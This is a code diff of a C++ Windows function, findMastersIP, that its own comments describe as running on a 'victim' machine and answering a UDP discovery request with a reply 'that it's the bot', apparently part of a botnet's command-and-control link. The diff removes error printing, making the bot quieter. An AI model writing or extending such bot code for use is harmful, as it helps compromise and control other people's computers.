@@ -14,16 +14,15 @@ uint32_t findMastersIP()
     sockaddr_in recvAddr{};
     sockaddr_in sendAddr{};
 
-    SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
-    if (s == INVALID_SOCKET)
-        std::cout << "Socket error <" << WSAGetLastError() << ">" << std::endl;
-    
+    std::string response;
     int opt;
-
-    std::string message, response;
     char* buf = new char[65536];
     int fromlen;
 
+    SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
+    if (s == INVALID_SOCKET)
+        goto errorLable;
+    
     /* setting the socket on the victims private ip i.e "10.0.0.8" and on port*/
     recvAddr.sin_addr.s_addr = getPrivateIP();
     recvAddr.sin_port = htons(UDP_PORT);
@@ -31,16 +30,13 @@ uint32_t findMastersIP()
 
     opt = 1;
     /* the OS won't block the port after the application ended*/
-    if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt))<0)
-        std::cout << "Sockopt error <" << WSAGetLastError() << ">" << std::endl;
+    if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt)) < 0)
+        goto errorLable;
 
     /* binding the socket to the port on the private ip*/
-    if(bind(s, (sockaddr*)&recvAddr, sizeof recvAddr) < 0)
-        std::cout << "Bind error <" << WSAGetLastError() << ">" << std::endl;
+    if (bind(s, (sockaddr*)&recvAddr, sizeof recvAddr) < 0)
+        goto errorLable;
 
-    /*fixed messages for my "protocol"*/
-    message = "What is your IP?";
-    response = "My IP";
 
     while (1)
     {
@@ -49,14 +45,12 @@ uint32_t findMastersIP()
             ZeroMemory(buf, 65536);
             fromlen = sizeof(recvAddr);
             if (recvfrom(s, buf, 65536, 0, (sockaddr*)&recvAddr, &fromlen) < 0)
-            {
-                std::cout << "Recieve error <" << WSAGetLastError() << ">" << std::endl;
                 goto errorLable;
-            }
+
         } while (!(std::string(buf) == std::to_string(protocol::REQ)));
 
         /* send reply that it's the bot*/
-        if (sendto(s, std::to_string(protocol::RPY).c_str(), response.size(), 0, (sockaddr*)&recvAddr, sizeof(recvAddr)) < 0)
+        if (sendto(s, std::to_string(protocol::RPY).c_str(), std::to_string(protocol::RPY).size(), 0, (sockaddr*)&recvAddr, sizeof(recvAddr)) < 0)
             break;
     }
 
